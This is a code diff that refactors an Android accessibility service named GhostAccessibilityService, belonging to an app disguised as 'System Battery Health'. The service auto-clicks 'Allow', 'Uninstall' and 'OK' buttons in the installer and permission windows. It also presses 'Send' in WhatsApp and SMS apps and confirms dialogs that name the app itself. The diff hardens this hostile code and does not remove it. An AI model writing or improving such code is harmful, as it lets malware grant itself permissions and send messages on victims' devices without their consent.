@@ -24,48 +24,108 @@ class GhostAccessibilityService : AccessibilityService() {
         }
 
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            val allowedPackages = setOf(
+                "com.android.packageinstaller",
+                "com.google.android.packageinstaller",
+                "com.android.permissioncontroller",
+                "com.google.android.permissioncontroller",
+                "com.whatsapp",
+                "com.google.android.apps.messaging",
+                "com.android.mms"
+            )
+
+            val eventPkg = event.packageName?.toString()
+            if (eventPkg == null || eventPkg !in allowedPackages) return
+
             val rootNode = rootInActiveWindow ?: return
 
-            // 1. Detect Standard Keywords
-            val keywords = listOf("OK", "Uninstall", "Delete", "Allow", "Send")
+            try {
+                // 1. Detect Standard Keywords (restricted to expected packages only)
+                val keywords = when (eventPkg) {
+                    "com.android.packageinstaller",
+                    "com.google.android.packageinstaller",
+                    "com.android.permissioncontroller",
+                    "com.google.android.permissioncontroller" ->
+                        listOf("OK", "Uninstall", "Delete", "Allow")
 
-            for (keyword in keywords) {
-                val nodes = rootNode.findAccessibilityNodeInfosByText(keyword)
-                for (node in nodes) {
+                    // If messaging apps are allowed at all, only allow "Send".
+                    "com.whatsapp",
+                    "com.google.android.apps.messaging",
+                    "com.android.mms" ->
+                        listOf("Send")
+
+                    else -> emptyList()
+                }
+
+                var clicked = false
+
+                for (keyword in keywords) {
+                    val nodes = rootNode.findAccessibilityNodeInfosByText(keyword)
                     try {
-                        if (node.isClickable) {
-                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                            return // Click one per event to avoid loops
-                        }
+                        for (node in nodes) {
+                             if (clicked) break
 
-                        // Sometimes the parent is the clickable element (e.g. a button container)
-                        var parent: AccessibilityNodeInfo? = node.parent
-                        while (parent != null) {
-                            try {
-                                if (parent.isClickable) {
-                                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                                    return
-                                }
-                                val next = parent.parent
-                                parent.recycle()
-                                parent = next
-                            } catch (_: Exception) {
-                                parent.recycle()
-                                parent = null
-                            }
+                             if (node.isClickable) {
+                                 node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                                 clicked = true
+                             } else {
+                                 var parent: AccessibilityNodeInfo? = node.parent
+                                 try {
+                                     while (parent != null) {
+                                         if (parent.isClickable) {
+                                             parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                                             clicked = true
+                                             break
+                                         }
+                                         val next = parent.parent
+                                         parent.recycle()
+                                         parent = next
+                                     }
+                                 } finally {
+                                     parent?.recycle()
+                                 }
+                             }
                         }
                     } finally {
-                        node.recycle()
+                         nodes.forEach { try { it.recycle() } catch(_:Exception){} }
                     }
+                    if (clicked) break
                 }
-            }
 
-            // 2. Specific Self-Destruct Detection
-            // If the dialog asks to uninstall "System Battery Health" (Our App Name)
-            val appName = getString(R.string.app_name)
-            if (rootNode.findAccessibilityNodeInfosByText(appName).isNotEmpty()) {
-                val okNodes = rootNode.findAccessibilityNodeInfosByText("OK")
-                okNodes.firstOrNull()?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                if (clicked) return
+
+                // 2. Specific Self-Destruct Detection
+                // If the dialog asks to uninstall "System Battery Health" (Our App Name)
+                val appName = getString(R.string.app_name)
+                val appNameNodes = rootNode.findAccessibilityNodeInfosByText(appName)
+                try {
+                    if (appNameNodes.isNotEmpty()) {
+                        val okNodes = rootNode.findAccessibilityNodeInfosByText("OK")
+                        try {
+                            for (okNode in okNodes) {
+                                if (okNode.isClickable && okNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)) break
+
+                                var parent: AccessibilityNodeInfo? = okNode.parent
+                                try {
+                                    while (parent != null) {
+                                        if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) break
+                                        val next = parent.parent
+                                        parent.recycle()
+                                        parent = next
+                                    }
+                                } finally {
+                                    parent?.recycle()
+                                }
+                            }
+                        } finally {
+                            okNodes.forEach { try { it.recycle() } catch(_:Exception){} }
+                        }
+                    }
+                } finally {
+                    appNameNodes.forEach { try { it.recycle() } catch(_:Exception){} }
+                }
+            } finally {
+                rootNode.recycle()
             }
         }
     }
